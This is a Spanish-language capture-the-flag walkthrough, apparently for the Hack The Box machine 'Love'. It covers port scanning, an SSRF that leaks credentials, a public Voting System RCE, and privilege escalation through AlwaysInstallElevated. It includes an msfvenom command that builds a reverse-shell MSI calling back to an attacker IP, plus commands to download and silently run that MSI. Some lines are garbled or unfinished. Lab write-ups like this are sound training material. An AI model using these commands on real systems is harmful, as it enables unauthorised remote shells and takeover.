#by d4l1
<p align="center"><img src=""></p>
<h1 align="center">LOVE</h1>

# ÍNDICE

# INICIO

Love es una máquina Windows fácil donde las cosas que encontramos con un sistema de aplicación de votos, conseguimos un codigo de ejecución remoto. Nuestro puerto escanea un servicio por el puerto 5000 donde el navegador descubre una pagina en el que tenemos acceso.
Encontramos una vulnerabilidad SSRF donde la explotacion ganamos una contraseña. Cuando tenemos las credenciales hacemos un escaneo de lsistema y ejecutamos un codigo apra atacar un usuaio del sistema.

Con una enumeración basica de windows nos revela una mala configuracion y tenemos la posibilidad de insertar un código malicioso para subir privilegios

Como siempre empezaremos a hacer un test de conectividad. 

![image](https://github.com/D4l1-web/HTB/assets/79869523/5adbbdba-36ec-47ae-b52f-c3765bf20643)

Posteriormente haremos un escaner de puertos.

![image](https://github.com/D4l1-web/HTB/assets/79869523/76201950-5fda-4fa3-a135-7eb1ceea6511)
![image](https://github.com/D4l1-web/HTB/assets/79869523/903ecf62-7183-4cae-b734-785d8e1b07db)

nmap nos revela un apache en el puerto 80, un smb un mysql en los puertos por defecto. Vemos un servicio corriendo por el puerto 5000 pero no sabemos lo que es solo sabemos que utiliza php 7.3.27. Love tiene dos dominios que podemos encontrar.

```
echo "10.10.14.22 www.love.htbs tating.love.htb" | sudo tee -a /etc/hosts

```
Cuando nos metemos a www.love.htb nos lleva a un login "Voting System"

![image](https://github.com/D4l1-web/HTB/assets/79869523/e46e007c-596a-46e3-be2e-c546418d9a99)

Si buscamos por casualidad "voting system exploit" nos encontramos con un RCE vulnerabilidad [exploit](https://www.exploit-db.com/exploits/49445)

Sin necesidad de ninguna contraseña podremos entrar o registrar una cuenta y luego continuar explorando informacion. Si buscamos "staging.love.htb" es un lugar para escanear archivos de posibilidad de malware. Si seleccionas la opcion beta, nosotros transferimos "beta.php" donde nosotros localizaremos el archivo que escanea la aplicación.

![image](https://github.com/D4l1-web/HTB/assets/79869523/8513576e-ed45-4e1e-8d78-020f9c171bf0)

![image](https://github.com/D4l1-web/HTB/assets/79869523/4e56507f-c761-424a-bfda-65744d19eb22)

Si intentamos escanear nuestra ip local por el puerto 127.0.0.1:5000 nos pondra algo interesante.

![image](https://github.com/D4l1-web/HTB/assets/79869523/ea5ed859-ed4e-424a-9404-0cb3d0d07772)

Acabamos de encontrar unas credenciales y gracias a esto ya podemos meter el exploit anterior

![image](https://github.com/D4l1-web/HTB/assets/79869523/39a3f18f-5e50-4a7b-8477-8cc9535b0b13)

Obviamnete abrimos un netcat para estar a la escucha por el puerto 8888
```
sudo nc -lvnp 8888
```

![image](https://github.com/D4l1-web/HTB/assets/79869523/a44607e5-8d44-4412-a756-eba5972d124c)

Dentro del usuario "Phoebe" encontramos la flag de user.

![image](https://github.com/D4l1-web/HTB/assets/79869523/89938acb-822e-4e49-8b1a-9b082b8ed3e4)

## ESCALADA DE PRIVILEGIOS

Para enumerar los registros comunes de windows, encontre "AlwaysInstallElevated" esta activo
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
![image](https://github.com/D4l1-web/HTB/assets/79869523/5f47bdd8-ae91-4997-9860-2287337a8ce5)

Podemos explotar esta vulnerabilidad y ejecutar un Windows installer (.msi) sin embargo si nosotros intentamos utilizar el payload no creo que funcione

Despues de una enumeracion solo ahy dos usuarios "Phoebe" y "administrator" 
```
get-applockerpolicy -effective | select -expandproperty rulecollections
```
Vamos a generar un msi malicioso con msfvenom
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.22 LPORT=4444 -f msi -o reverse.msi
```
Deberemos abrir 

Nos metemos al directorio C:\Administration
![image](https://github.com/D4l1-web/HTB/assets/79869523/80b6f820-1e76-410e-a031-fd706dfca8ef)

Abrimos un servidor de python 

```
python -m http.server
nc -lvnp 4444
```

Descargamos el archivo de nuestro ordenador local con wget y ejecutamos

```
wget 10.10.14.22:8000/reverse.msi -o reverse.msi
msiexec /quiet /i reverse.msi
```
Como veremos no nos dejara deberemos estar en powershell en nuestra máquina windows
```
powershell
```
![image](https://github.com/D4l1-web/HTB/assets/79869523/8dbe98ef-aa3b-42bd-ad92-cfa7ff92105e)

![image](https://github.com/D4l1-web/HTB/assets/79869523/f445697e-c3fa-4d63-908b-02fe1691f1af)

![image](https://github.com/D4l1-web/HTB/assets/79869523/73167bae-180a-4f38-805f-b3035b8b2f1a)

GG







